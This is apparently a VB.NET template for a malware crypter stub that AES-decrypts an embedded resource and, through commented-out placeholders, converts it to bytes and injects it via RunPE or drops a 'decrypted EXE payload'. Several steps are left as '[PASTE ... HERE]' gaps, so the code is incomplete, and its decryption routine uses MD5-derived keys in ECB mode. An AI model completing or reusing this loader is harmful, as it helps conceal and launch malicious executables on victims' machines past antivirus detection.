﻿Module Module2

    Dim Bytes() As Byte
    Dim Hex As String

    Sub main()
        '>>>Decrypt AES
        Hex = AES_Decrypt(My.Resources.encrypted, "[ENCRYPTION KEY HERE]")
        'MsgBox("Decrypted AES")

        '>>Convert HEX to Bytes

        'XxX
        'Bytes = [PASTE 1 FUNCTION HERE](Hex)
        'MsgBox("Converted HEX to Bytes")

        '>>Deploy Bytes to RunPE
        'Dim x As New ??? : x.???(Bytes, Process.GetCurrentProcess.MainModule.FileName)

        'XxX
        '[PASTE 2 FUNCTION HERE]decrypted EXE payload

        'System.IO.File.WriteAllBytes("c:\users\stronger\desktop\msgbox2.exe", Bytes)
        'MsgBox("Dropped decrypted EXE payload")

        'IMPORTANT: For some reason only EXE in "Debug" folder works, one in "Release" folder gives error.
    End Sub

    Public Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function

    '[PASTE 1 HERE]'

End Module
